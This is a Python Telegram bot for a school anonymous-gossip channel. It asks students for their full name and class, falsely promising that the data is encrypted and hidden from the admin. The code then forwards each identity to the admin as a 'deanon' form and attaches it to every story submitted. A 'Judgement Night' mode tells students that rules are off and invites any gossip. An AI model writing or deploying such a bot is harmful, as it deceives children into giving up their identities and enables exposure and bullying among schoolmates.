import telebot
from telebot import types
from flask import Flask, request
import os

# Автоматически берем настройки из скрытых переменных Render
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME")

# Имя вашего аккаунта на Render (нужно для вебхука)
# Бот сам поймет адрес, прокси на Render НЕ НУЖНЫ!
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Файлы базы данных на сервере
BLACKLIST_FILE = "blacklist.txt"
USERS_FILE = "users.txt"
STORIES_DB_FILE = "stories_db.txt"
PROFILES_FILE = "profiles.txt"

judgement_night = False
admin_state = {}
user_state = {}

def load_list(filename):
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def save_item(filename, item):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{item}\n")

def remove_item(filename, item):
    existing = load_list(filename)
    if str(item) in existing:
        existing.remove(str(item))
        with open(filename, "w", encoding="utf-8") as f:
            for i in existing:
                f.write(f"{i}\n")

def get_profile(user_id):
    if os.path.exists(PROFILES_FILE):
        with open(PROFILES_FILE, "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith(f"{user_id}:"):
                    return line.split(":", 1)[1].strip()
    return None

BAN_MESSAGE = "❌ Ты забанен в нашем боте за спам или нарушение правил."

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID:
        return
    global judgement_night
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📊 Статистика", "📋 Все анкеты")
    markup.row("🚫 Забанить по ID", "🟢 Разбанить по ID")
    j_text = "🩸 Выключить Судную ночь" if judgement_night else "🩸 Включить Судную ночь"
    markup.row(j_text)
    markup.row("❌ Закрыть админку")
    bot.send_message(ADMIN_ID, "⚙️ **Админ-панель школьной подслушки:**", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if str(user_id) in load_list(BLACKLIST_FILE):
        bot.send_message(message.chat.id, BAN_MESSAGE)
        return

    save_item(USERS_FILE, user_id)
    
    if not get_profile(user_id):
        user_state[user_id] = "wait_profile"
        bot.send_message(
            message.chat.id,
            "⚠️ **В меру безопасности админа, введена защита.**\n\n"
            "Напиши свое имя и фамилию вместе с классом, бот зашифрует и система поймет что вы реальный ученик, а не фейк. "
            "Админ НЕ увидит ваше имя и фамилию это полностью анонимно."
        )
        return

    if judgement_night:
        bot.send_message(message.chat.id, "🚨 **🚨 СУДНАЯ НОЧЬ НАЧАЛАСЬ!** 🚨\n\nПравила отключены! Пишите абсолютно любые сплетни! 🩸😈")
    else:
        bot.send_message(message.chat.id, "Привет! Напиши сюда свой секрет или историю, и admin опубликует её анонимно.\n\nВ самом канале никто не узнает, кто автор!")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    if str(user_id) in load_list(BLACKLIST_FILE):
        bot.send_message(message.chat.id, BAN_MESSAGE)
        return

    if user_state.get(user_id) == "wait_profile":
        save_item(PROFILES_FILE, f"{user_id}:{message.text}")
        user_state[user_id] = None
        alert_admin = f"📇 **Новая анкетка деанона!**\n🆔 ID: `{user_id}`\n👤 ТГ: {message.from_user.full_name}\n📝 Ввод: `{message.text}`"
        bot.send_message(ADMIN_ID, alert_admin, parse_mode="Markdown")
        bot.send_message(message.chat.id, "✅ Проверка успешно пройдена! Теперь ты можешь присылать истории анонимно!")
        return

    if user_id == ADMIN_ID:
        if message.text == "📊 Статистика":
            total_users = len(set(load_list(USERS_FILE)))
            banned_users = len(load_list(BLACKLIST_FILE))
            bot.send_message(ADMIN_ID, f"📈 **Статистика подслушки:**\n\n👤 Учеников в боте: `{total_users}`\n🚫 В бане: `{banned_users}`", parse_mode="Markdown")
            return
        elif message.text == "📋 Все анкеты":
            if not os.path.exists(PROFILES_FILE) or os.path.getsize(PROFILES_FILE) == 0:
                bot.send_message(ADMIN_ID, "🗄 База анкет пока пуста.")
                return
            output = "📋 **Список всех учеников:**\n\n"
            with open(PROFILES_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    if ":" in line:
                        uid, info = line.split(":", 1)
                        output += f"🆔 `{uid}` — {info.strip()}\n"
            bot.send_message(ADMIN_ID, output, parse_mode="Markdown")
            return
        elif message.text == "🚫 Забанить по ID":
            admin_state[ADMIN_ID] = "wait_ban"
            bot.send_message(ADMIN_ID, "Введите ID для бана:")
            return
        elif message.text == "🟢 Разбанить по ID":
            admin_state[ADMIN_ID] = "wait_unban"
            bot.send_message(ADMIN_ID, "Введите ID для разбана:")
            return
        elif message.text in ["🩸 Включить Судную ночь", "🩸 Выключить Судную ночь"]:
            global judgement_night
            judgement_night = not judgement_night
            status = "ВКЛЮЧЕН" if judgement_night else "ВЫКЛЮЧЕН"
            bot.send_message(ADMIN_ID, f"🔔 Режим Судной ночи **{status}**!")
            cmd_admin(message)
            if judgement_night:
                bot.send_message(CHANNEL_USERNAME, "🚨🩸 **ВНИМАНИЕ! НА КАНАЛЕ НАЧАЛАСЬ СУДНАЯ НОЧЬ!** 🩸🚨\n\nЦензура и правила отключены! Сливы публикуются прямо сейчас! 😈👇")
            else:
                bot.send_message(CHANNEL_USERNAME, "🛑 🩸 **СУДНАЯ НОЧЬ ОКОНЧЕНА.** 🛑\n\nРежим повышенной жесткости отключен.")
            return
        elif message.text == "❌ Закрыть админку":
            bot.send_message(ADMIN_ID, "Админка закрыта.", reply_markup=types.ReplyKeyboardRemove())
            return
            
        if admin_state.get(ADMIN_ID) == "wait_ban":
            admin_state[ADMIN_ID] = None
            save_item(BLACKLIST_FILE, message.text.strip())
            bot.send_message(ADMIN_ID, f"✅ Пользователь {message.text} забанен!")
            return
        elif admin_state.get(ADMIN_ID) == "wait_unban":
            admin_state[ADMIN_ID] = None
            remove_item(BLACKLIST_FILE, message.text.strip())
            bot.send_message(ADMIN_ID, f"✅ Пользователь {message.text} разбанен!")
            return

        bot.send_message(ADMIN_ID, "Используйте Reply (Ответить), чтобы написать пользователю.")
        return

    # --- ПРИЕМ ИСТОРИИ ---
    real_profile = get_profile(user_id)
    if not real_profile:
        user_state[user_id] = "wait_profile"
        bot.send_message(message.chat.id, "⚠️ Сначала пройдите верификацию!")
        return

    with open(STORIES_DB_FILE, "a", encoding="utf-8") as f:
        f.write(f"{message.message_id}:{message.text.replace('\n', ' ')}\n")

    prefix = "🩸 [СУДНАЯ НОЧЬ]" if judgement_night else "📩 Новая история!"
    user_info = f"{prefix}\n👤 **Отправитель:** `{real_profile}`\n🆔 ID: `{user_id}`\n-------------------------\n\n{message.text}"
    markup = types.InlineKeyboardMarkup()
    btn_text = "🩸 ОПУБЛИКОВАТЬ" if judgement_night else "📢 Опубликовать в канал"
    markup.add(types.InlineKeyboardButton(text=btn_text, callback_data=f"pub_{message.message_id}"))
    bot.send_message(ADMIN_ID, user_info, parse_mode="Markdown", reply_markup=markup)
    bot.send_message(message.chat.id, "Спасибо! Твоя история отправлена на модерацию.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pub_"))
def callback_publish(call):
    if call.from_user.id != ADMIN_ID: return
    try:
        msg_id_str = call.data.replace("pub_", "")
        story_text = None
        if os.path.exists(STORIES_DB_FILE):
            with open(STORIES_DB_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    if line.startswith(msg_id_str + ":"):
                        story_text = line.split(":", 1)[1].strip()
                        break
        if not story_text:
            bot.answer_callback_query(call.id, "Ошибка: история не найдена")
            return
        clean_post = f"🩸 **[СУДНАЯ НОЧЬ]** 🩸\n\n{story_text}" if judgement_night else f"{story_text}\n\n*(Анонимно)*"
        bot.send_message(chat_id=CHANNEL_USERNAME, text=clean_post)
        bot.edit_message_reply_markup(chat_id=ADMIN_ID, message_id=call.message.message_id, reply_markup=None)
        bot.send_message(ADMIN_ID, "✅ Опубликовано!")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ Ошибка: {str(e)}")
if __name__ == "__main__":
    print("Бот успешно запущен на Render в режиме Polling...")
    bot.infinity_polling()

